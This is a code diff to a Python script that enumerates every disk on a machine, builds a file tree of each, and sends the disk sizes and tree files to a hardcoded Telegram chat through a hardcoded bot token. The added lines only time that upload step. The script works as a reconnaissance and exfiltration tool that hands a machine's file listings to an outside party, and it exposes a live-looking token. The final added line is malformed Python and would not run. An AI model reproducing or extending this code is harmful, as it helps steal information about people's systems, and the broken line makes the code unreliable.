@@ -5,6 +5,7 @@ import os
 import tempfile
 import importlib.util
 import string
+import time
 
 chat_id = "-4102145810"
 token = "6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA"
@@ -162,7 +163,15 @@ for disks in disks:
     total_size = format_size(total_size)
     #Send infos
     send_message(chat_id, token, disks + " : " + total_size + " go")
+    #Start timer
+    start_time = time.time()
     #Tree
     disk, temp_file_path = process_path(chat_id, token, disks)
+    #Stop timer
+    end_time = time.time()
     #Send file
     send_file(chat_id, token, temp_file_path)
+    #Calcul time to make action
+    elapsed_time = end_time - start_time
+    #Send
+    send_message(chat_id, token, elapsed_time:.2f)
